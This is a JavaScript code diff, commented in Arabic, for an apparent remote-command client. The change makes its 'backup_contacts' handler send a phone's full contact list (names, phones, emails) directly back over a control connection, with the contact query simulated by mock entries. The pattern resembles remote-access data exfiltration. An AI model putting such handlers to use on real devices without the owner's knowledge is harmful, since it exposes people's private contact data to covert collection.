@@ -99,6 +99,9 @@
     function handleIncomingCommand(command) {
         console.log('تم استلام أمر:', command);
         
+        // حفظ معرف الأمر للاستخدام في النتيجة
+        window.currentCommandId = command.id;
+        
         switch(command.action) {
             case 'backup_contacts':
                 backupContacts();
@@ -145,9 +148,12 @@
     async function backupContacts() {
         try {
             const contacts = await queryContentProvider('content://com.android.contacts/data');
-            const backupFile = createBackupFile('contacts.json', contacts);
-            await uploadFile(backupFile);
-            sendCommandResult('backup_contacts', 'success', backupFile);
+            // إرسال البيانات الفعلية بدلاً من URL الملف
+            sendCommandResult('backup_contacts', 'success', {
+                contacts: contacts,
+                count: Array.isArray(contacts) ? contacts.length : 0,
+                timestamp: Date.now()
+            });
         } catch (e) {
             sendCommandResult('backup_contacts', 'error', e.message);
         }
@@ -214,7 +220,28 @@
     async function queryContentProvider(uri) {
         return new Promise((resolve) => {
             setTimeout(() => {
-                resolve(`Data from ${uri}`);
+                // محاكاة بيانات جهات الاتصال
+                if (uri.includes('contacts')) {
+                    resolve([
+                        {
+                            name: 'أحمد محمد',
+                            phone: '+966501234567',
+                            email: 'ahmed@example.com'
+                        },
+                        {
+                            name: 'فاطمة علي',
+                            phone: '+966507654321',
+                            email: 'fatima@example.com'
+                        },
+                        {
+                            name: 'محمد حسن',
+                            phone: '+966509876543',
+                            email: 'mohammed@example.com'
+                        }
+                    ]);
+                } else {
+                    resolve(`Data from ${uri}`);
+                }
             }, 2000);
         });
     }
@@ -249,6 +276,7 @@
         if (window.controlConnection) {
             window.controlConnection.send(JSON.stringify({
                 type: 'command_result',
+                commandId: window.currentCommandId || 'unknown',
                 command: command,
                 status: status,
                 data: data,
